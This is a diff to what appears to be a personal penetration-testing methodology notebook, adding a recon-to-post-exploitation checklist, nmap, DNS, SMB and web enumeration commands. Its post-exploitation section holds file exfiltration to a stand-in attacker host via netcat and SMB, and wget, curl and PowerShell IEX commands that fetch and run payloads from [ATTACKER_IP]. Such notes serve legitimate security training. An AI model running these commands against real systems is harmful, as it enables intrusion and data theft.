@@ -24,6 +24,65 @@ You may then wish to do any/all of the following
 - exfiltrate data (passwords, audit logs, user information, database dumps)
 - establish persistence on the host (remote access tools, rootkits, webshell backdoors)
 
+# Flowchart
+
+This flowchart provides a high-level overview of the steps involved:
+
+![[Pasted image 20210628184558.png]]
+
+## High Level Steps
+
+- **Reconnaisance**
+	- Network Discovery
+		- Run DNS Enumeration on known domain names
+		- Scan for live hosts within an IP range
+	- Check [Shodan](https://www.shodan.io/) against target IP addresses
+		- Google any exploits identified by Shodan
+	- Nmap
+		- Run standard scripts scan against top ports
+		- All ports scan
+		- UDP scan
+		- OS Enumeration
+			- Check operating system version for CVEs
+		- Vulnerability scan on specific ports
+- **Test services** found in Reconnaisance Stage
+	- Interact with the service manually
+	- Check [Hacktricks](https://book.hacktricks.xyz) for advice on penetration testing the service
+	- Enumerate version numbers
+		- In banners when connecting to the service
+		- Using `nmap`'s suite of scripts
+		- Infer from other hosts on network/operating system version/age of the target machine
+	- Search version numbers in searchsploit (run `searchsploit -u` first)
+	- Attempt to login to or register for the service
+		- With known credentials
+		- With default credentials
+	- Fuzz the service with potential dangerous/unexpected input
+	- If available, analyse code for the service
+- **Identify an Exploit**
+	- Check the exploit has no prerequisites (certain version numbers, authenticated access) that you have not met
+	- Test locally if possible
+	- What does the exploit do?
+		- Leak information?
+			- Use this information to further enumerate services
+			- Use this information to log in to a service
+		- Allow code execution?
+			- Can you get a shell?
+- **Gaining A Shell**
+	- If you have code execution, try to get a shell on the system
+		- Try multiple shell payloads
+			- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+			- [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+			- [HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+			- Try generating one with `msfvenom`
+		- Try multiple languages
+			- If the site runs on ASP, also try ASPX or JSP
+		- Try well-known ports
+	- **Post Exploitation**
+		- Re-enumeration
+		- Privilege Escalation
+		- Data Exfiltration
+		- Persistence
+
 # Enumeration
 
 Enumeration is a wide topic, so this section contains a lot of detail on different stages and services.
@@ -32,11 +91,23 @@ Enumeration is a wide topic, so this section contains a lot of detail on differe
 
 Use this enumeration to do initial scans of the network - the hosts & services discovered can then be subsequently enumerated.
 
+If you have both a domain and a public IP address, scan both - they may have different results, especially if the domain is protected by something like cloudflare.
+
+Scan internal IP addresses with [[nmap]] if you have access to the internal network.
+
+### Scan a Domain Name
+
+Find an IP for a domain name using `host`:
+
+```bash
+$ host example.com
+```
+
 ### Network Host Enumeration
 
 Use these commands to discover hosts on a subnet.
 
-#### Nmap
+#### Nmap Host Scan
 
 Scan multiple targets on your subnet (assuming you are aware of a host with the IP address `a.b.c.d`):
 
@@ -99,6 +170,12 @@ With high speed:
 $ nmap -p- --min-rate=10000 -oA nmap/target-allports [IP/HOST]
 ```
 
+Autorecon verbose version:
+
+```bash
+$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oA nmap/verbose-allports [IP/HOST]
+```
+
 If you find new ports, rescan them:
 
 ```bash
@@ -123,6 +200,12 @@ Takes guesses at the operating system (requires root privileges):
 
 ```bash
 $ sudo nmap -O -oA nmap/target-os [IP/HOST]
+```
+
+If SMB is running, you can use the `smb-os-discovery` script:
+
+```bash
+$ nmap --script smb-os-discovery [IP/HOST]
 ```
 
 #### UDP
@@ -157,6 +240,16 @@ Zone transfer (may expose more domains):
 $ dig axfr [IP/HOST]
 ```
 
+Supply the target itself as a DNS server if it's running DNS:
+
+```bash
+$ dig axfr [IP/HOST] @[IP/HOST]
+```
+
+## Enumerating Specific Services
+
+If you find a service running on the target, and you haven't seen it before, search "Pentesting \[service\]" in Google - you will often find a hacktricks page.
+
 ## Automated Web Enumeration
 
 Before running Gobuster, check [[Methodology Checklist#What Powers the Site|what powers the site]]
@@ -169,6 +262,8 @@ Before running Gobuster, check [[Methodology Checklist#What Powers the Site|what
 $ mkdir gobuster
 $ gobuster dir -u http://[IP/DOMAIN] -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster/root
 ```
+
+Make sure to use the extension you've found with `-x [extension]`.
 
 Alternative list if running out of ideas:
 
@@ -194,6 +289,10 @@ Then you can run a second scan recursively on the directories you've found.
 
 ## Manual Web Enumeration
 
+When enumerating the site:
+- check both HTTP and HTTPS versions
+- check both IPs and domains
+
 ### Turn on Burp Suite
 
 - Launch Burp
@@ -211,6 +310,10 @@ Look for:
 - hidden elements (`display: none` etc)
 - form elements
 
+### Check robots.txt
+
+Navigate to `/robots.txt` to check for any disallowed pages.
+
 ### What Powers the Site?
 
 #### Checking Extensions
@@ -222,7 +325,7 @@ Try to visit the following:
 - `index.aspx`
 - `index.jsp`
 
-Stop as soon as one of them loads
+Stop as soon as one of them loads.
 
 #### Checking Site Headers
 
@@ -231,6 +334,12 @@ Use `curl` to read the `X-Powered-By` header:
 ```bash
 $ curl -v [TARGET]
 ```
+
+#### Wappalyser
+
+[Wappalyser](https://www.wappalyzer.com/) is a browser extension that can be used to enumerate the tech stack running on the site. Install it from [here](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/) (Firefox) or [here](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en) (Chrome).
+
+Source is available [here](https://github.com/AliasIO/wappalyzer).
 
 #### Searchsploit
 
@@ -242,6 +351,33 @@ $ searchsploit term1 [term2] ... [termN]
 ```
 
 Use flags such as `-e` for an exact match, `--exclude="term"` to not match certain terms.
+
+### Identify Interactivity on Site
+
+- Where can you supply user input?
+- Can you register for an account?
+	- Can you change any hidden fields to manipulate registration?
+- Can you upload files?
+	- Are there any restrictions on the file type? Are they server-side or client-side? See [[File Upload]]
+- Are there any experiemental features, or things that are not fully implemented/under maintenance?
+	- They may have weaker security
+	- Look for beta, maintenance, development directories and subdomains
+
+### Search History of Site
+
+Has anything important or sensitive been removed?
+- check google cache
+- check archive.is
+- check archive.org
+- check wayback machine
+
+### OSINT
+
+Get a feel for the site or site owners' public profile:
+- search the name of the company or site owner
+	- do they have a github? could it have site source in it?
+- find usernames on the site - run them through [nixintel.info](https://nixintel.info/)
+- Run `exiftools` on images
 
 ## SMB Enumeration
 
@@ -257,6 +393,12 @@ Enumerate with null authentication:
 
 ```bash
 $ smbmap -u null -p "" -H 10.10.10.40
+```
+
+Or with a specific user:
+
+```bash
+$ smbmap -u username -H 10.10.10.40
 ```
 
 ### smbclient
@@ -293,6 +435,12 @@ Once connected, use the following commands to enumerate files:
 # Post Exploitation
 
 ## File Transfer
+
+See more at:
+- [https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)
+- [https://book.hacktricks.xyz/exfiltration](https://book.hacktricks.xyz/exfiltration)
+- [https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/](https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/)
+- [https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
 
 ### Exfiltration
 
@@ -331,3 +479,35 @@ $ nc -w 3 [HOST_IP] [PORT] < /path/to/file
 ```
 
 See more at [[netcat]]
+
+#### SMB
+
+Locally:
+
+```bash
+$ sudo impacket-smbserver share .
+```
+
+On target machine:
+
+```bash
+$ copy /path/to/file \\ATTACKER_IP\share\
+```
+
+### Upload Techniques
+
+- HTTP (running a `python3 -m http.server` to serve files)
+	- `wget` - `wget http://[ATTACKER_IP]/file -O /path/to/file`
+	- `curl` - `curl http://[ATTACKER_IP]/file -o /path/to/file`
+- SCP - on attacker machine, run `scp /path/to/target/file [user@][TARGET]:/target/path`
+- FTP - upload to an FTP share and find where the files are stored (make sure you're in `binary` mode when uploading `.exe` files)
+- Powershell `Invoke-WebRequest` (similar to `wget`) - `powershell.exe -command "Invoke-WebRequest http://[ATTACKER_IP]:[PORT]/file -o file`
+- Powershell `IEX` (executes `.ps1` after downloading it) - `IEX (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]/file.ps1')"`
+- SMB Server
+	- Run `sudo impacket-smbserver share .` locally
+	- Run `copy \\[ATTACKER_IP\share\file`
+- SMB Share - Upload to an SMB share and find where the files are stored
+
+Windows writeable directories - write here if you can't write anywhere else:
+- `%temp%`
+- `\windows\system32\spool\drivers\color\`
